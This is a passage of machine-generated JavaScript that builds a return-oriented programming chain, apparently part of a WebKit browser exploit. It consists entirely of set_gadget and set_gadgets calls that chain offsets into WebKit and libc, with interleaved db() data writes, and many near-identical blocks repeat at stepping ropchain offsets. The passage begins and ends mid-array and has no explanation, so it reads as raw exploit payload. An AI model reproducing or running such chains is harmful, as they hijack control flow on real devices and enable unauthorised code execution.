webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+253288, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253568, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+253584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+785347, 
libc_base+793877, 
ropchain+253800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+253768, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+253816, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+253992, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+253944, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+254096, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+254080, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+254192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+254280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+254400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+254384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+254472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877 
]);
db([3, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+254584, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+254672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+254840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+254872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+254824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+254856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+254944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+254960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+255080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255096, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+255064, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255208, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255304, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+255408, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+255392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255504, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255520, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+255616, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+255704, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+255768, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([272, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+256048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+256136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+256152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+256304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+256336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+256288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+256320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+256432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+256416, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+256536, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+294288, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+793877, 
ropchain+256648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256720, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256864, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+256936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257008, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257080, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257152, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257224, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257296, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257368, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257440, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257872, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+257944, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258088, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258160, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258304, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258376, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258448, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258520, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258592, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258664, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258736, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258808, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+258952, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259024, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259096, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259528, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259672, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259744, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259888, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+259960, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260104, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260248, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260392, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260464, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260608, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260680, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260752, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260824, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260896, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+260968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261040, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261112, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261184, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261328, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261400, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261544, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261832, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261904, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+261976, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262048, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262408, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+262984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
